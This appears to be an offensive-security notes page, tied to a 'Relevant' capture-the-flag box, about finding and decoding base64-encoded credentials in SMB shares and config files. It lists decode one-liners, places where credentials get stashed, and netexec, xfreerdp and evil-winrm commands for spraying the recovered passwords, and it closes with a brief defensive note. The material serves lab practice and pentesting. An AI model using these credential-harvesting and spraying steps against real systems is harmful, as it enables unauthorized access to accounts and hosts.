# Base64-Encoded Credentials in Files & Shares

Used on: **Relevant**

Operators love to "obfuscate" credentials by base64-encoding them and dropping the result inside a file shared with the team. It's reversible by anyone who finds the file — and any file ending in `passwords.txt`, `creds.txt`, `secrets.bak`, `notes.docx` should be assumed to contain encoded creds rather than missing them.

## How It Works

Pure base64 (RFC 4648) is a 1:1 reversible encoding. A value like `Qm9iIC0gIVBAJCRXMHJEITEyMw==` decodes to literally `Bob - !P@$$W0rD!123`. No key, no salt, no entropy — running `base64 -d` is the entire attack.

A surprisingly large fraction of "encrypted" credentials in the wild are this. Always try base64 (and its sibling encodings) **first**.

## Steps

### 1. Spot the file

`passwords.txt` style — long base64 strings, often `==` or `=` padded, fixed line widths:

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Telltale signs: `==` padding, alphabet limited to `[A-Za-z0-9+/=]`, lines that are 4-byte multiples.

### 2. Decode

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Bob - !P@$$W0rD!123

echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```

PowerShell equivalent:
```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Qm9iIC0gIVBAJCRXMHJEITEyMw=="))
```

### 3. Bulk decode every line in a file

```bash
while read line; do echo "$line" | base64 -d 2>/dev/null && echo; done < passwords.txt
```

Or in one pass:
```bash
awk 'NF{print | "base64 -d; echo"}' passwords.txt
```

## Variants

| Encoding | Detection hint | Decoder |
|----------|----------------|---------|
| **Base64 (standard)** | `[A-Za-z0-9+/=]`, multiple of 4, `==` padding | `base64 -d` |
| **Base64 URL-safe** | `[A-Za-z0-9_-]` (no `+` `/`), no padding | `base64 --decode --ignore-garbage` after `tr '_-' '/+'` |
| **Base32** | `[A-Z2-7=]` only, multiple of 8 | `base32 -d` |
| **Hex** | `[0-9a-f]`, even length | `xxd -r -p` |
| **ROT-13** | letters only, looks like nonsense English | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` |
| **Reversed string** | reads backwards | `rev` |
| **Double-encoded** | base64 of a base64 string | decode twice |

## Where to Look

| Location | Why |
|----------|-----|
| SMB shares (especially `nt4wrksv`, `helpdesk`, `it-share`, `Profiles$`) | "Self-service" credential drops |
| `\\<host>\netlogon\` or `\\<host>\sysvol\` | Logon scripts often embed encoded service-account creds |
| `\Users\<user>\Desktop\notes.txt`, `passwords.txt`, `todo.txt` | Operator habit |
| Web app config files (`appsettings.json`, `web.config`) | "Encoded" = base64; rarely encrypted |
| Email metadata / PSTs | NTLM auth headers, encoded SMTP creds |
| Ticket / wiki exports | Confluence and Jira plain-base64 happens |
| Browser local storage | OAuth tokens, sometimes rooms-of-base64-creds |

## Once Decoded

If decoding produces `<user> - <password>` style lines, **spray them**:

```bash
# SMB
netexec smb $TARGET -u 'Bob' -p '!P@$$W0rD!123'
netexec smb $TARGET -u userlist.txt -p passlist.txt --continue-on-success

# RDP
xfreerdp /v:$TARGET /u:Bob /p:'!P@$$W0rD!123'

# WinRM
evil-winrm -i $TARGET -u Bob -p '!P@$$W0rD!123'
```

See [password-spraying.md](../ad/password-spraying.md).

## Defensive Note

- Base64 is **not encryption**. Use a proper secrets manager (HashiCorp Vault, AWS Secrets Manager, KeePass with a strong master).
- "We base64-encoded the password file" should never be a control. Treat any encoded blob in a share as plaintext.

## Related

- [smb-anonymous-enum.md](../ad/smb-anonymous-enum.md) — getting access to the share that holds the file
- [smb-write-iis-execution.md](../web-rce/smb-write-iis-execution.md) — Relevant chain: encoded creds gave write access, then RCE
- [password-spraying.md](../ad/password-spraying.md) — what to do once you've decoded a list
- [bash-history-credentials.md](bash-history-credentials.md) — sibling: `.bash_history` style cred discovery


